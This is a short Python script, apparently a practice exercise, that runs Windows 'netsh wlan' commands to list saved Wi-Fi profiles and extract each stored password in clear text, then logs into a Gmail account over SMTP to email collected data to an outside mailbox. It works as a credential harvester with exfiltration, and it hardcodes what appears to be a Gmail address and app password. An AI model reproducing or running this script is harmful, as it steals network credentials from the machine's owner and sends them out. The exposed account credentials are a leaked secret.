#!/usr/bin/env python
import subprocess, smtplib, re

# C:\Users\Ajlal\AppData\Local\Programs\Python\Python311\python.exe practice12.py
# command in cmd that shows password of previously or currently connected to wifi network with key=clear means show password in clear text
# netsh wlan show profile  abdurrahim key=clear


def send_mail(email, password, message):
    # creating smtp server
    server = smtplib.SMTP("smtp.gmail.com", 587)
    # tls connection
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
result = subprocess.check_output(command, shell=True)
network_names = re.findall('(?:Profile\s*:\s)(.*)', str(result))
cleaned_network_names = network_names[0].split('\\r\\n')
final_list = []
l1=[]
for i in range(0,len(cleaned_network_names)):
    if '    All User Profile     : ' in cleaned_network_names[i]:
        final_list.append(cleaned_network_names[i].split('    All User Profile     : '))

l=[]
for j in final_list:
    for k in j:
        if k!='':
            l.append(k)
l.append(cleaned_network_names[0])
l.remove("ACCOR")
cleaned_network_pass=[]
for i in l:

    new_command = 'netsh wlan show profile '+f'"{i}"'+' key=clear'
    result_pass = subprocess.check_output(new_command, shell=True)
    network_pass= re.findall('(?:Key Content\s*\:*)(.*)', str(result_pass))
    for j in network_pass:
        cleaned_network_pass.append(j.split('\\r\\n\\r\\nCost'))

final_pass=[]
d={}
for i in range(0,len(cleaned_network_pass)):
    final_pass.append(cleaned_network_pass[i][0])
    d[l[i]]=cleaned_network_pass[i][0]
print(d)
send_mail('dear69devil@gmail.com', 'dyjklwblabcnyqjw', l)


